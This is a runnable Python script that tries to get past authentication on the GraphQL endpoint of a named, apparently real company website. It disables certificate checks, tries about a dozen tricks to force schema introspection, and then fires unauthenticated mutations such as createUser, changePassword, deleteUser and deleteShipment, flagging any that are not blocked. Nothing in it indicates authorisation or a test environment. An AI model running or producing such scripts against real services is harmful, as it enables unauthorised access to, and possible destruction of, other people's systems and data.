#!/usr/bin/env python3
import urllib.request
import json
import ssl
import urllib.parse

ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

BASE = "https://www.visiwise.co/graphql/"

def req(payload, method="POST", proxy=None):
    data = json.dumps(payload).encode()
    h = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
    r = urllib.request.Request(BASE, data=data, headers=h, method=method)
    
    if proxy:
        opener = urllib.request.build_opener(urllib.request.ProxyHandler({'http': proxy, 'https': proxy}))
        urllib.request.install_opener(opener)
    
    try:
        resp = urllib.request.urlopen(r, timeout=15, context=ssl_ctx)
        return resp.getcode(), resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return 0, str(e)

print("=== GRAPHQL AUTH BYPASS TESTS ===\n")

# 1. Standard introspection
code, body = req({"query": "{ __schema { types { name } } }"})
print(f"1. Standard introspection: HTTP {code}")

# 2. Batched queries
batch = [{"query": "{ __typename }"}, {"query": "{ __schema { queryType { name } } }"}]
code, body = req(batch)
print(f"2. Batched queries: HTTP {code}: {body[:150]}")

# 3. GET request with query param
url = "https://www.visiwise.co/graphql/?query=" + urllib.parse.quote("{ __typename }")
r = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
try:
    resp = urllib.request.urlopen(r, timeout=15, context=ssl_ctx)
    print(f"3. GET request: HTTP {resp.getcode()}: {resp.read().decode()[:150]}")
except Exception as e:
    print(f"3. GET request: ERROR {e}")

# 4. Directive-based bypass @skip(if: false)
code, body = req({"query": "{ __schema @skip(if: false) { types { name } } }"})
print(f"4. @skip(if: false): HTTP {code}: {body[:150]}")

# 5. Directive-based bypass @include(if: true)
code, body = req({"query": "{ __schema @include(if: true) { types { name } } }"})
print(f"5. @include(if: true): HTTP {code}: {body[:150]}")

# 6. Fragment spread
code, body = req({"query": "fragment FullSchema on __Schema { types { name } } query { ...FullSchema }"})
print(f"6. Fragment spread: HTTP {code}: {body[:150]}")

# 7. Aliased query
code, body = req({"query": "{ schema: __schema { types { name } } }"})
print(f"7. Aliased query: HTTP {code}: {body[:150]}")

# 8. Minified query
code, body = req({"query": "{__schema{types{name}}}"})
print(f"8. Minified: HTTP {code}: {body[:150]}")

# 9. With comments
code, body = req({"query": "{ # comment\n__schema { types { name } } }"})
print(f"9. With comments: HTTP {code}: {body[:150]}")

# 10. Operation name
code, body = req({"operationName": "Introspection", "query": "query Introspection { __schema { types { name } } }"})
print(f"10. With operationName: HTTP {code}: {body[:150]}")

# 11. Variables (empty)
code, body = req({"query": "query($x: String) { __schema { types { name } } }", "variables": {}})
print(f"11. With empty variables: HTTP {code}: {body[:150]}")

# 12. Try to query actual types (not __schema)
code, body = req({"query": "{ __typename }"})
print(f"12. __typename only: HTTP {code}: {body[:150]}")

# 13. Try common mutation names
mutations = [
    "createUser", "register", "login", "signUp", "signIn",
    "createShipment", "createContainer", "trackContainer",
    "updateProfile", "changePassword", "resetPassword",
    "deleteUser", "deleteShipment", "archiveShipment",
]
print("\n=== TESTING COMMON MUTATION NAMES ===")
for mut in mutations:
    code, body = req({"query": f"mutation {{ {mut} {{ __typename }} }}"})
    if "Cannot query field" not in body and "NotLoggedIn" not in body:
        print(f"  POTENTIAL: {mut} -> HTTP {code}: {body[:100]}")
    else:
        print(f"  {mut}: HTTP {code} (blocked)")